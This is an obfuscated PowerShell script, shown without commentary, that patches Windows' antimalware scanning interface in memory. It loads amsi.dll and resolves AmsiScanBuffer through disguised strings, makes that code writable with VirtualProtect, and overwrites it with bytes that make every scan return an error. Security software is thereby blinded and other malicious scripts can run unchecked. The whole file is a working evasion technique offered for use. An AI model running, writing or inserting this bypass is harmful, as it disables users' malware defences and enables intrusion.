$ZRT_DFwHd = @"
using System;
using System.Runtime.InteropServices;
public class ZRT_DFwHd {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr TctXtX92vrThHnyaq, string h_2);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr o4AHWp6cevHyxbSEX1t, UIntPtr aaTH89hQQAu0rw, uint o2sOruA, out uint BUD4d);
}
"@

Add-Type $ZRT_DFwHd

$mbWmnqTpl = [ZRT_DFwHd]::LoadLibrary("$(('âmsì'+'.dll').normAlIZE([cHAR]([BytE]0x46)+[cHaR](111*41/41)+[CHar](114)+[cHAr](109*80/80)+[cHAR]([bYTE]0x44)) -replace [CHAR](58+34)+[CHAR](112*11/11)+[CHar](123)+[CHAR](55+22)+[ChaR](110)+[char]([bYTe]0x7d))")
$Wl04_SF4Soik = [ZRT_DFwHd]::GetProcAddress($mbWmnqTpl, "$([cHar](65+31-31)+[CHAR]([Byte]0x6d)+[chAR]([byTE]0x73)+[cHar](35+70)+[chaR]([ByTE]0x53)+[cHAR](99)+[chAr](97*29/29)+[cHAr](22+88)+[ChaR]([bytE]0x42)+[CHAR](50+67)+[ChAr](102*87/87)+[cHaR]([bYte]0x66)+[Char]([BYte]0x65)+[cHAr](46+68))")
$p = 0
[ZRT_DFwHd]::VirtualProtect($Wl04_SF4Soik, [uint32]5, 0x40, [ref]$p)
$tbma8LkqiydzXj6D = "0xB8"
$szh = "0x57"
$JKCyn0n2uOhWlsUgLHv = "0x00"
$hg6j2n = "0x07"
$aYdIv_iJZULu = "0x80"
$nCdr5Ves1 = "0xC3"
$cATGUWR1dVL4Uc47P7 = [Byte[]] ($tbma8LkqiydzXj6D,$szh,$JKCyn0n2uOhWlsUgLHv,$hg6j2n,+$aYdIv_iJZULu,+$nCdr5Ves1)
[System.Runtime.InteropServices.Marshal]::Copy($cATGUWR1dVL4Uc47P7, 0, $Wl04_SF4Soik, 6)